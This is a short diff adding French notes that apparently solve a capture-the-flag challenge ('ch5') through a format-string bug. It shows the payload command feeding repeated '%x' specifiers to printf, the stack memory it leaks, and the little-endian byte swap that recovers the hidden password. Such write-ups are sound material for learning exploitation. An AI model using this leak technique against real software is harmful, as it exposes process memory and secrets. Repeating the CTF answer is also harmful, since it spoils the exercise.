@@ -1,0 +1,13 @@
+#le printf n'est pas utilise comme il le doit. on peut donc mettre un argument formatter, ce qui nous permet de voir ce qu'il y a en memoire
+#on met suffisament de %x, on repere une chaine de caractere. c'est une architecture en little endian, on inverse les bytes.
+
+'./ch5 `python -c 'print "%x-"*20'`'
+
+
+20-804b008-b7fceff4-8048570-8049ff4-2-bffffcd4-b7fcf3e4-d-804b008-
+affichable  >   39617044-28293664-6d617045-b7000a64
+plus affichable  >   -b7e5ce65-b7fed230-0-8048579-efd32a00-8048570-
+
+44706139 64362928 4570616d 640a00bf
+
+regarder dans le code ascii pour la soluce.
